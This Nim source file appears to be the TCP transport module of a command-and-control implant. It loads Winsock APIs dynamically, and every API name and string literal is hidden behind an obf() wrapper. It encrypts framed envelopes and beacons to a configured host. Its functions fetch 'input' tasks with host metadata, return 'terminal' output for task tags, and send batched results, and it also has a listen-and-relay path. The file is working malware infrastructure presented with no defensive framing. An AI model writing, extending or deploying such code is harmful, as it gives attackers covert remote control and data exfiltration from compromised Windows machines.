import ../global
import ../general/metadata
import ../general/strings
import ../crypt/transport
import ../winapi/handlers
import ./frame_chunk
import ./relay_packet
import std/json

type
  TWSAStartup = proc(wVersionRequested: uint16; lpWSAData: pointer): cint {.stdcall.}
  TRecv = proc(s: culong; buf: pointer; len: cint; flags: cint): cint {.stdcall.}
  TSend = proc(s: culong; buf: pointer; len: cint; flags: cint): cint {.stdcall.}
  TSocket = proc(af, typ, protocol: cint): culong {.stdcall.}
  TBind = proc(s: culong; name: pointer; namelen: cint): cint {.stdcall.}
  TListen = proc(s: culong; backlog: cint): cint {.stdcall.}
  TAccept = proc(s: culong; peer: pointer; peerLen: pointer): culong {.stdcall.}
  TConnect = proc(s: culong; name: pointer; namelen: cint): cint {.stdcall.}
  TClosesocket = proc(s: culong): cint {.stdcall.}
  TSetsockopt = proc(s: culong; level, optname: cint; optval: pointer; optlen: cint): cint {.stdcall.}
  TGetaddrinfo = proc(node, service: cstring; hints: pointer; res: ptr pointer): cint {.stdcall.}
  TFreeaddrinfo = proc(res: pointer) {.stdcall.}
  THtons = proc(hostshort: uint16): uint16 {.stdcall.}

const
  afInet = 2
  sockStream = 1
  ipprotoTcp = 6
  solSocket = 0xFFFF
  soReuseaddr = 4
  soRcvtimeo = 0x1006
  invalidSocket = culong(0xFFFFFFFF)
  socketError = -1

type
  SockAddrIn = object
    sinFamily: uint16
    sinPort: uint16
    sinAddr: uint32
    sinZero: array[8, byte]

  AddrInfoA = object
    aiFlags: cint
    aiFamily: cint
    aiSocktype: cint
    aiProtocol: cint
    aiAddrlen: culong
    aiCanonname: cstring
    aiAddr: pointer
    aiNext: pointer

var
  wsaOk = false
  fnWSAStartup: TWSAStartup
  fnSocket: TSocket
  fnBind: TBind
  fnListen: TListen
  fnAccept: TAccept
  fnConnect: TConnect
  fnRecv: TRecv
  fnSend: TSend
  fnClosesocket: TClosesocket
  fnSetsockopt: TSetsockopt
  fnGetaddrinfo: TGetaddrinfo
  fnFreeaddrinfo: TFreeaddrinfo
  fnHtons: THtons
  ws2mod: pointer

proc ws2load(api: string): pointer =
  # Loads a winsock function from the ws2 library
  if ws2mod == nil:
    ws2mod = loadLibraryA(obf("ws2_32"))
  if ws2mod == nil:
    return nil
  getProcAddress(ws2mod, api)

template ws2fn(T: typedesc; name: string; cache: untyped): untyped =
  # Loads the winsock function once and returns the cached pointer
  if cache == nil:
    cache = cast[T](ws2load(name))
  cache

proc wsaEnsure*(): bool =
  # Starts winsock once and remembers that it is ready
  if wsaOk:
    return true
  let startup = ws2fn(TWSAStartup, obf("WSAStartup"), fnWSAStartup)
  if startup == nil:
    return false
  var wsa: array[400, byte]
  zeroMem(addr wsa[0], wsa.len)
  if startup(0x0202'u16, addr wsa[0]) != 0:
    return false
  wsaOk = true
  true

proc readFrameSocket*(fd: culong): string =
  # Reads a framed payload from the socket
  result = ""
  let recvFn = ws2fn(TRecv, obf("recv"), fnRecv)
  if recvFn == nil:
    return ""
  while true:
    var hdr: array[4, char]
    var got = 0
    while got < 4:
      let n = recvFn(fd, addr hdr[got], cint(4 - got), cint(0))
      if n <= 0:
        return ""
      got += n
    let hdrVal = frameHdrFromBE(hdr)
    let pieceLen = framePieceLen(hdrVal)
    let more = frameHasMore(hdrVal)
    if pieceLen <= 0:
      return ""
    var body = newString(pieceLen)
    got = 0
    while got < pieceLen:
      let n = recvFn(fd, addr body[got], cint(pieceLen - got), cint(0))
      if n <= 0:
        return ""
      got += n
    result.add body
    if not more:
      break

proc writeFrameSocket*(fd: culong, payload: string) =
  # Writes the payload to the socket as framed chunks
  if payload.len <= 0:
    return
  let sendFn = ws2fn(TSend, obf("send"), fnSend)
  if sendFn == nil:
    return
  var off = 0
  while off < payload.len:
    let pieceLen = min(frameChunkSize, payload.len - off)
    let more = off + pieceLen < payload.len
    let hdr = frameHdrToBE(frameHdrEncode(pieceLen, more))
    var sent = 0
    while sent < 4:
      let n = sendFn(fd, addr hdr[sent], cint(4 - sent), cint(0))
      if n <= 0:
        return
      sent += n
    sent = 0
    while sent < pieceLen:
      let n = sendFn(fd, addr payload[off + sent], cint(pieceLen - sent), cint(0))
      if n <= 0:
        return
      sent += n
    off += pieceLen

proc tcpConnect*(host: string, port: int): culong =
  # Resolves the host and opens a tcp connection
  if not wsaEnsure():
    return 0
  let getaddr = ws2fn(TGetaddrinfo, obf("getaddrinfo"), fnGetaddrinfo)
  let socketFn = ws2fn(TSocket, obf("socket"), fnSocket)
  let connectFn = ws2fn(TConnect, obf("connect"), fnConnect)
  let freeaddr = ws2fn(TFreeaddrinfo, obf("freeaddrinfo"), fnFreeaddrinfo)
  let closeFn = ws2fn(TClosesocket, obf("closesocket"), fnClosesocket)
  if getaddr == nil or socketFn == nil or connectFn == nil:
    return 0
  var hints = AddrInfoA(
    aiFamily: afInet,
    aiSocktype: sockStream,
    aiProtocol: ipprotoTcp
  )
  var res: pointer = nil
  let sport = $port
  if getaddr(host.cstring, sport.cstring, addr hints, addr res) != 0:
    return 0
  defer:
    if res != nil and freeaddr != nil:
      freeaddr(res)
  let s = socketFn(
    cast[ptr AddrInfoA](res).aiFamily,
    cast[ptr AddrInfoA](res).aiSocktype,
    cast[ptr AddrInfoA](res).aiProtocol
  )
  if s == invalidSocket:
    return 0
  if connectFn(s, cast[ptr AddrInfoA](res).aiAddr, cast[ptr AddrInfoA](res).aiAddrlen.cint) == socketError:
    if closeFn != nil:
      discard closeFn(s)
    return 0
  s

proc tcpListen*(port: int): culong =
  # Binds a tcp socket and starts listening on the port
  if not wsaEnsure():
    return 0
  let socketFn = ws2fn(TSocket, obf("socket"), fnSocket)
  let bindFn = ws2fn(TBind, obf("bind"), fnBind)
  let listenFn = ws2fn(TListen, obf("listen"), fnListen)
  let setsockoptFn = ws2fn(TSetsockopt, obf("setsockopt"), fnSetsockopt)
  let htonsFn = ws2fn(THtons, obf("htons"), fnHtons)
  let closeFn = ws2fn(TClosesocket, obf("closesocket"), fnClosesocket)
  if socketFn == nil or bindFn == nil or listenFn == nil or htonsFn == nil:
    return 0
  let s = socketFn(afInet, sockStream, ipprotoTcp)
  if s == invalidSocket:
    return 0
  var yes: cint = 1
  if setsockoptFn != nil:
    discard setsockoptFn(s, solSocket, soReuseaddr, addr yes, 4)
  var addrIn = SockAddrIn(
    sinFamily: afInet.uint16,
    sinPort: htonsFn(port.uint16),
    sinAddr: 0
  )
  if bindFn(s, addr addrIn, sizeof(addrIn).cint) == socketError:
    if closeFn != nil:
      discard closeFn(s)
    return 0
  if listenFn(s, 128) == socketError:
    if closeFn != nil:
      discard closeFn(s)
    return 0
  s

proc tcpAccept*(listenFd: culong): culong =
  # Accepts one incoming tcp connection
  let acceptFn = ws2fn(TAccept, obf("accept"), fnAccept)
  if acceptFn == nil:
    return 0
  let client = acceptFn(listenFd, nil, nil)
  if client == invalidSocket:
    return 0
  client

proc tcpClose*(fd: culong) =
  # Closes the tcp socket
  let closeFn = ws2fn(TClosesocket, obf("closesocket"), fnClosesocket)
  if closeFn != nil and fd != 0 and fd != invalidSocket:
    discard closeFn(fd)

proc tcpRecv*(fd: culong, maxBytes: int): seq[byte] =
  # Reads up to the given number of bytes from the socket
  let recvFn = ws2fn(TRecv, obf("recv"), fnRecv)
  if recvFn == nil or fd == 0 or fd == invalidSocket:
    return @[]
  var buf = newSeq[byte](maxBytes)
  let n = recvFn(fd, addr buf[0], maxBytes.cint, cint(0))
  if n <= 0:
    return @[]
  buf.setLen(n.int)
  buf

proc tcpSend*(fd: culong, data: string) =
  # Sends the data on the socket
  if data.len == 0:
    return
  let sendFn = ws2fn(TSend, obf("send"), fnSend)
  if sendFn == nil or fd == 0 or fd == invalidSocket:
    return
  discard sendFn(fd, unsafeAddr data[0], data.len.cint, cint(0))

proc tcpSetRecvTimeout*(fd: culong) =
  # Sets the receive timeout on the socket
  if relayTimeout <= 0:
    return
  let setsockoptFn = ws2fn(TSetsockopt, obf("setsockopt"), fnSetsockopt)
  if setsockoptFn == nil:
    return
  var ms = relayTimeout.cint
  discard setsockoptFn(fd, solSocket, soRcvtimeo, addr ms, cint(sizeof(ms)))

proc tcpExchange*(payload: var string): TransportResponse =
  # Encrypts the payload, exchanges it over tcp, and decrypts the reply
  let p = parsePortDigits(port)
  if p == 0:
    return transportFail(obf("invalid_port portStr=") & port)
  if payload.len == 0:
    return transportFail(obf("empty_payload"))
  if not wsaEnsure():
    return transportFail(obf("wsa_startup_failed"))
  var fd = tcpConnect(host, p)
  if fd == 0:
    return transportFail(obf("tcp_connect_failed host=") & host & obf(" port=") & $p)
  try:
    let sentLen = payload.len
    var enc = cryptEncrypt(payload)
    payload.setLen(0)
    if enc.len == 0:
      return transportFail(obf("encrypt_failed host=") & host & obf(" port=") & $p)
    writeFrameSocket(fd, enc)
    enc.setLen(0)
    tcpSetRecvTimeout(fd)
    let wire = readFrameSocket(fd)
    var raw = ""
    try:
      raw = cryptDecrypt(wire)
    except CatchableError:
      discard
    if raw.len == 0:
      return transportFail(obf("tcp_read_empty host=") & host & obf(" port=") & $p &
        obf(" sentLen=") & $sentLen)
    result = parseTransportResponse(raw)
  finally:
    tcpClose(fd)

proc sendRequest*(tag: string): TransportResponse =
  # Builds the input request with metadata and sends it over tcp
  var content = %*{(obf("option")): obf("input"), (obf("host")): tag}
  content[obf("metadata")] = createMetadata()
  var envelope = buildEnvelope(content)
  result = tcpExchange(envelope)

proc sendOutput*(taskTag, output: string): TransportResponse =
  # Sends the terminal output for the given task tag over tcp
  var envelope = buildEnvelope(%*{
    (obf("option")): obf("output"),
    (obf("type")): obf("terminal"),
    (obf("task_tag")): taskTag,
    (obf("output")): output,
  })
  result = tcpExchange(envelope)

proc sendBatch*(payload: string): TransportResponse =
  # Attaches metadata to each batch item and sends the batch over tcp
  if payload.len <= 2 or payload == obf("[]"):
    return transportFail(obf("empty_batch payloadLen=") & $payload.len)
  try:
    let batch = parseJson(payload)
    if batch.kind == JArray:
      let meta = createMetadata()
      for item in batch:
        if item.kind == JObject:
          item[obf("metadata")] = meta
    var envelope = buildEnvelope(batch)
    result = tcpExchange(envelope)
  except JsonParsingError as e:
    result = transportFail(obf("batch_json_parse: ") & e.msg & obf(" payloadPreview=") & clipText(payload))
